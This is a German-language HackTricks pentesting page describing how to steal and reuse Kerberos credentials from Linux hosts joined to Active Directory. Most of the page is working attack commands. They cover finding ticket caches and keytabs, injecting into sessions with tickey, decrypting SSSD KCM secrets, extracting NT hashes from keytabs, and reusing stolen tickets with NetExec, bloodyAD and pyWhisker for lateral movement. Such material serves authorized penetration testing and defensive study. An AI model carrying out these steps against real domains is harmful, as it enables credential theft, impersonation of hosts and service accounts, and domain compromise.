# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Eine Linux-Maschine kann sich ebenfalls innerhalb einer Active-Directory-Umgebung befinden.

Eine Linux-Maschine innerhalb einer AD kann **Kerberos-Material lokal speichern**: Benutzer-Caches, Maschinen-/Service-Keytabs und von SSSD verwaltete Secrets. Diese Artefakte können in der Regel wie alle anderen Kerberos-Credentials wiederverwendet werden. Um die meisten davon zu lesen, müssen Sie normalerweise der Benutzer sein, dem das Ticket gehört, oder **root** auf der Maschine sein.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Aufzählung

### AD-Aufzählung von Linux aus

Wenn Sie über Linux (oder eine Bash unter Windows) Zugriff auf eine AD haben, können Sie [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) ausprobieren, um die AD aufzuzählen.

Sie können auch die folgende Seite konsultieren, um **weitere Möglichkeiten zur Aufzählung einer AD von Linux aus** kennenzulernen:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA ist eine Open-Source-**Alternative** zu Microsoft Windows **Active Directory**, hauptsächlich für **Unix**-Umgebungen. Es kombiniert ein vollständiges **LDAP-Verzeichnis** mit einem MIT-**Kerberos**-Key Distribution Center für eine Verwaltung ähnlich wie bei Active Directory. Durch die Verwendung des Dogtag-**Certificate System** für die Verwaltung von CA- und RA-Zertifikaten unterstützt es **Multi-Faktor**-Authentifizierung, einschließlich Smartcards. SSSD ist für Unix-Authentifizierungsprozesse integriert.<sup>[[14]](#references)[[15]](#references)</sup> Mehr darüber erfahren Sie unter:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefakte eines in die Domäne eingebundenen Hosts

Bevor Sie Tickets untersuchen, ermitteln Sie, **wie der Host in die AD eingebunden wurde** und **wo das Kerberos-Material tatsächlich gespeichert ist**. Auf modernen Linux-Hosts wird dies häufig mit `realmd` + `adcli` + `sssd` gehandhabt und nicht nur durch einfache Dateien in `/tmp`.<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Dies zeigt dir schnell, ob der Host AD vertraut, ob SSSD Identitäten oder Tickets cached und ob **machine/service keytabs** oder **KCM secrets** zur Ausnutzung verfügbar sind.<sup>[[4]](#references)[[10]](#references)</sup>

## Arbeiten mit Tickets

### Pass The Ticket

Auf dieser Seite findest du verschiedene Orte, an denen du **Kerberos-Tickets innerhalb eines Linux-Hosts finden** kannst. Auf der folgenden Seite erfährst du, wie du diese CCache-Ticketformate in Kirbi (das Format, das du unter Windows verwenden musst) umwandelst und wie du einen PTT-Angriff durchführst:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Wenn du die **Linux-spezifischen Workflows zur Ticketgewinnung** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` usw.) suchst, sieh dir die entsprechende Seite an:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Wiederverwendung von CCACHE-Tickets aus /tmp

CCACHE-Dateien sind Binärformate zum **Speichern von Kerberos-Anmeldedaten**. `FILE:/tmp/krb5cc_%{uid}` ist weiterhin üblich, aber moderne Linux-Deployments verwenden auch `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` oder `KCM:%{uid}`. Überprüfe die Umgebungsvariable **`KRB5CCNAME`** und die Einstellung `default_ccache_name`, bevor du annimmst, dass sich Tickets in `/tmp` befinden.<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### CCACHE-Ticket-Wiederverwendung aus dem Keyring

**Kerberos-Tickets, die im Speicher eines Prozesses gespeichert sind, können extrahiert werden**, insbesondere wenn der ptrace-Schutz deaktiviert ist (`/proc/sys/kernel/yama/ptrace_scope`). Ein nützliches Tool für diesen Zweck ist unter [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) zu finden. Es erleichtert die Extraktion, indem es sich in Sitzungen injiziert und Tickets nach `/tmp` dump’t.<sup>[[1]](#references)[[16]](#references)</sup>

Zur Konfiguration und Verwendung dieses Tools werden die folgenden Schritte ausgeführt:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Dieses Verfahren versucht, in verschiedene Sessions zu injizieren. Der Erfolg wird dadurch angezeigt, dass extrahierte Tickets mit der Namenskonvention `__krb_UID.ccache` in `/tmp` gespeichert werden.<sup>[[1]](#references)</sup>

### CCACHE-Ticket-Wiederverwendung aus SSSD KCM

SSSD verwaltet eine Kopie der Datenbank unter dem Pfad `/var/lib/sss/secrets/secrets.ldb`. Der zugehörige Schlüssel wird als versteckte Datei unter dem Pfad `/var/lib/sss/secrets/.secrets.mkey` gespeichert. Standardmäßig ist der Schlüssel nur lesbar, wenn du über **root**-Berechtigungen verfügst.<sup>[[4]](#references)</sup>

Der Aufruf von **`SSSDKCMExtractor`** mit den Parametern --database und --key analysiert die Datenbank und **entschlüsselt die Secrets**.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
Der Extractor gibt rohe Kerberos-JSON-Payloads aus; konvertiere sie in einen nutzbaren Ticket-Cache oder ein anderes Ticketformat, bevor du Pass-the-Cache-/Pass-the-Ticket-Operationen durchführst.<sup>[[4]](#references)</sup>

### Schnelle Keytab-Triage
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Konten aus /etc/krb5.keytab extrahieren

Schlüssel von Dienstkonten, die für Dienste mit Root-Berechtigungen unerlässlich sind, werden sicher in **`/etc/krb5.keytab`**-Dateien gespeichert. Diese Schlüssel, die Passwörtern für Dienste ähneln, erfordern strikte Vertraulichkeit.<sup>[[5]](#references)</sup>

Um den Inhalt der Keytab-Datei zu überprüfen, kann **`klist`** verwendet werden. Unter Linux gibt `klist -k -K -e` die Principals, Schlüsselversionsnummern, Verschlüsselungstypen und das rohe Schlüsselmaterial aus. Wenn der Schlüsseltyp **23 / RC4-HMAC** ist, entspricht der Schlüsselwert außerdem dem **NT-Hash** dieses Principals.<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Für Linux-Benutzer bietet **`KeyTabExtract`** Funktionen zum Extrahieren des RC4-HMAC-Hashs, der für die Wiederverwendung von NTLM-Hashes genutzt werden kann. Dies hilft jedoch nur, wenn die keytab noch **etype 23 / RC4-HMAC**-Material enthält. In **AES-only**-Umgebungen erhältst du möglicherweise keinen wiederverwendbaren NT-Hash, kannst dich aber weiterhin direkt über Kerberos mit der keytab authentifizieren.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
Unter macOS dient **`bifrost`** als Tool zur Analyse von Keytab-Dateien.<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Mithilfe der extrahierten Konto- und Hash-Informationen können Verbindungen zu Servern mit Tools wie **`NetExec`** hergestellt werden.<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### Das Maschinenkonto aus `/etc/krb5.keytab` wiederverwenden

Auf Systemen, die mit `realmd`/`adcli`/`sssd` verbunden sind, enthält `/etc/krb5.keytab` normalerweise das **Computerkonto** und einen oder mehrere **Host-/Service-Principals**. Wenn du **root** hast, solltest du die Datei nicht einfach ausgeben: Verwende einen der mit `klist -k` aufgelisteten Principals, um ein TGT anzufordern und als der Linux-Host selbst zu agieren.<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Dies ist besonders nützlich, wenn das **Computerobjekt** selbst delegierte Rechte in AD besitzt oder der Host berechtigt ist, andere Secrets wie ein **gMSA** abzurufen.<sup>[[13]](#references)</sup>

### Gestohlenes Kerberos-Material mit Linux-first-AD-Tools wiederverwenden

Sobald du über einen gültigen `ccache` oder ein nutzbares Keytab verfügst, kannst du direkt **von Linux aus** mit AD arbeiten, ohne zunächst alles in Windows-Formate zu konvertieren. Viele moderne Tools unterstützen `KRB5CCNAME` / Kerberos-Authentifizierung nativ.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Dies ist eine gute Verbindung zwischen **Linux post-exploitation** und dem Missbrauch von **AD objects**. Für die eigentlichen **object-level abuse paths** siehe:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux-gMSA- / Managed-Service-Account-Artefakte

Aktuelle Linux-Deployments können **Managed Service Accounts** direkt aus AD verwenden. In der Praxis bedeutet dies, dass du nach der Kompromittierung eines Linux-Servers möglicherweise nicht nur das **host keytab**, sondern auch **service-specific keytabs** findest, die aus einer gMSA generiert wurden. Häufige Orte zur Untersuchung sind `/etc/gmsad.conf`, deployment-spezifische Konfigurationsdateien und zusätzliche `*.keytab`-Dateien unter `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Dies gibt dir eine wiederverwendbare Kerberos-Identität für die an dieses gMSA gebundenen SPNs, **ohne einen Windows-Endpunkt zu berühren**.<sup>[[13]](#references)</sup> Für den Missbrauch von **domainseitigen** gMSA/dMSA nach dem Erlangen höherer Berechtigungen in AD siehe:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Wie greift man Kerberos an?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Zugriff auf AD mit einem verwalteten Dienstkonto – Direkte Integration von RHEL-Systemen in Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos-Umgebungsvariablen – MIT Kerberos Documentation](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Die von Microsoft Windows verwendeten RC4-HMAC-Kerberos-Verschlüsselungstypen](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Kerberos verwenden | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Identitätsdomänen ermitteln und ihnen beitreten | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD-Benutzerhandbuch](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Über | FreeIPA-Dokumentation](https://www.freeipa.org/About.html)
- [15] [Versionshinweise zu FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Dokumentation des Linux-Kernels](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
